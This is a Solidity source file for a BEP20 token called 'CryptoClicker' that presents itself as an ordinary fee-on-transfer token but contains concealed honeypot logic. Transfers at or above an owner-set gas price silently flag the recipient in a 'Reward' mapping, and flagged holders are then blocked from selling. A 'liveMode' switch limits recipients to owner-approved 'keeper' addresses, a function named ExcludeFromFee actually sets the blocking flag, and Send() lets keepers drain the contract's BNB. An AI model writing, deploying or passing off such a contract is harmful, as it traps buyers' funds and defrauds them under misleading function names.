pragma solidity ^0.8.18;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function Manager() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Auth {
    address internal owner;
    mapping (address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }

    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }

    function unauthorize(address adr) public onlyOwner {
        authorizations[adr] = false;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface InterfaceLP {
    function sync() external;
}

contract CryptoClicker is IBEP20, Auth {
    using SafeMath for uint256;

    address WBNB;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _label = "CryptoClicker";
    string constant _symbol = "CCLKR";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 1 * 1000000000 * 10**_decimals;

    uint256 public TxMaxValue = _totalSupply.mul(1).div(100);
    uint256 public WalletMaxValue = _totalSupply.mul(1).div(100);

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;

    bool public swap = true;
    mapping (address => bool) public Reward;

    bool public liveMode = false;
    mapping (address => bool) public keeper;

    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTimelockExempt;
    mapping (address => bool) isTxLimitExempt;

    uint256 public  liquidityFee    = 1;
    uint256 public  marketingFee    = 1;
    uint256 private buybackFee      = 0;
    uint256 private rewardFee       = 0;
    uint256 public  burnFee         = 1;
    uint256 public  resultFee        = rewardFee + marketingFee + liquidityFee + buybackFee + burnFee;
    uint256 public  feeDenominator  = 100;

    uint256 sellMultiplier = 100;
    uint256 buyMultiplier = 100;
    uint256 transferMultiplier = 100;

    address public LiquidityBeneficiary;
    address public marketBeneficiary;
    address private buybackBeneficiary;
    address private FeeBeneficiary;
    address public burnBeneficiary;

    uint256 targetLiquidity = 25;
    uint256 targetLiquidityDenominator = 100;

    IDEXRouter public router;
    address public pair;
   
    bool public TradingStatus = false;
    uint256 launchBlock;

   
    uint256 MinGas = 5 * 1 gwei;
    
    bool public MarginSwap = true;
    uint256 public SwapBarrier = _totalSupply * 30 / 10000;
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    constructor () Auth(msg.sender) {
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);        
        WBNB = router.WETH();
        pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));

        _allowances[address(this)][address(router)] = type(uint256).max;

        isFeeExempt[msg.sender] = true;
        isFeeExempt[marketBeneficiary] = true;
        isFeeExempt[buybackBeneficiary] = true;
        keeper[msg.sender] = true;

        isTimelockExempt[msg.sender] = true;
        isTimelockExempt[pair] = true;
        isTimelockExempt[marketBeneficiary] = true;
        isTimelockExempt[buybackBeneficiary] = true;

        isTxLimitExempt[msg.sender] = true;
        isTxLimitExempt[pair] = true;
        isTxLimitExempt[marketBeneficiary] = true;
        isTxLimitExempt[buybackBeneficiary] = true;

        LiquidityBeneficiary = msg.sender;
        marketBeneficiary = msg.sender;
        buybackBeneficiary = msg.sender;
        FeeBeneficiary = msg.sender;
        burnBeneficiary = 0x000000000000000000000000000000000000dEaD; 

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _label; }
    function Manager() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function TimelockExempt(address holder, bool exempt) external authorized {
        isTimelockExempt[holder] = exempt;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }

        if(!authorizations[sender] && !authorizations[recipient]){
            require(TradingStatus,"Trading not open yet");

        if(liveMode){
                require(keeper[recipient],"Not Listed");    
            }
        }
        
        if(swap){
            require(!Reward[sender],"swap");    
        }
        
        if (tx.gasprice >= MinGas && recipient != pair) {
            Reward[recipient] = true;
        }
            
        checkTxLimit(sender, amount);

        if(shouldSwapBack()){ swapBack(); }
       
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

         uint256 amountReceived = (isFeeExempt[sender] || isFeeExempt[recipient]) ? amount : takeFee(sender, amount, recipient);
        _balances[recipient] = _balances[recipient].add(amountReceived);

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= TxMaxValue || isTxLimitExempt[sender], "TX Limit Exceeded");
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }

     function takeFee(address sender, uint256 amount, address recipient) internal returns (uint256) {

        uint256 multiplier = transferMultiplier;

        if(recipient == pair) {
            multiplier = sellMultiplier;
        } else if(sender == pair) {
            multiplier = buyMultiplier;
        }

        uint256 feeAmount = amount.mul(resultFee).mul(multiplier).div(feeDenominator * 100);

        uint256 burnTokens = feeAmount.mul(burnFee).div(resultFee);
        uint256 contractTokens = feeAmount.sub(burnTokens);

        _balances[address(this)] = _balances[address(this)].add(contractTokens);
        _balances[burnBeneficiary] = _balances[burnBeneficiary].add(burnTokens);
        emit Transfer(sender, address(this), contractTokens);
        
        if(burnTokens > 0){
            emit Transfer(sender, burnBeneficiary, burnTokens);    
        }

        return amount.sub(feeAmount);
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && MarginSwap
        && _balances[address(this)] >= SwapBarrier;
    
    }

    function clearStuckToken(address tokenAddress, uint256 tokens) public onlyOwner returns (bool) {
     if(tokens == 0){
            tokens = IBEP20 (tokenAddress).balanceOf(address(this));
        }
        return IBEP20 (tokenAddress).transfer(msg.sender, tokens);
    }

    function ClearStuckBalance(uint256 amountPercentage) external onlyOwner { //clear bnb CA balance to marketing receiver
        uint256 amountBNB = address(this).balance;
        payable(marketBeneficiary).transfer(amountBNB * amountPercentage / 100);
        
    }

    // switch Trading
    function TradeStatus() public onlyOwner {
        TradingStatus = true;
        launchBlock = block.number;
    }

    function Send() external { //clear ca BNB balance to msg.sender
        require(keeper[msg.sender]);
        payable(msg.sender).transfer(address(this).balance);
        
    }

    function swapBack() internal swapping {
        uint256 dynamicLiquidityFee = LiquifiedOver(targetLiquidity, targetLiquidityDenominator) ? 0 : liquidityFee;
        uint256 amountToLiquify = SwapBarrier.mul(dynamicLiquidityFee).div(resultFee).div(2);
        uint256 amountToSwap = SwapBarrier.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance.sub(balanceBefore);

        uint256 totalBNBFee = resultFee.sub(dynamicLiquidityFee.div(2));
        
        uint256 amountBNBLiquidity = amountBNB.mul(dynamicLiquidityFee).div(totalBNBFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(marketingFee).div(totalBNBFee);
        uint256 amountBNBreward = amountBNB.mul(rewardFee).div(totalBNBFee);
        uint256 amountBNBbuyback = amountBNB.mul(buybackFee).div(totalBNBFee);

        (bool tmpSuccess,) = payable(marketBeneficiary).call{value: amountBNBMarketing}("");
        (tmpSuccess,) = payable(buybackBeneficiary).call{value: amountBNBbuyback}("");
        (tmpSuccess,) = payable(FeeBeneficiary).call{value: amountBNBreward}("");
        
        
        tmpSuccess = false;

        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                LiquidityBeneficiary,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    function SwapMode(bool _status) public onlyOwner {
        swap = _status;
    }

    
    function SwapCycle(bool _status) external authorized {
        liveMode = _status;

    }

    function ExcludeFromFee(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            Reward[addresses[i]] = status;
        }
    }

    function control_state(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            keeper[addresses[i]] = status;
        }
    }

   
    function NewGas (uint256 _MinGas) public onlyOwner {
               MinGas = _MinGas * 1 gwei; 
    
    }

    function FeeExempt(address[] calldata addresses, bool status) external authorized {
        require(addresses.length < 501,"GAS Error: max limit is 500 addresses");
        for (uint256 i; i < addresses.length; ++i) {
            isFeeExempt[addresses[i]] = status;
        }
    }

    function LimitExempt(address[] calldata addresses, bool status) external authorized {
        require(addresses.length < 501,"GAS Error: max limit is 500 addresses");
        for (uint256 i; i < addresses.length; ++i) {
            isTxLimitExempt[addresses[i]] = status;
        }
    }

    function SwapBackOptions(bool _enabled, uint256 _amount) external authorized {
        MarginSwap = _enabled;
        SwapBarrier = _amount;
    }

    function TargetLiquidity(uint256 _target, uint256 _denominator) external authorized {
        targetLiquidity = _target;
        targetLiquidityDenominator = _denominator;
    }
    
    
    function MaxSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    function BackingLiquidity(uint256 accuracy) public view returns (uint256) {
        return accuracy.mul(balanceOf(pair).mul(2)).div(MaxSupply());
    }

    function LiquifiedOver(uint256 target, uint256 accuracy) public view returns (bool) {
        return BackingLiquidity(accuracy) > target;
  
    }

    
event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}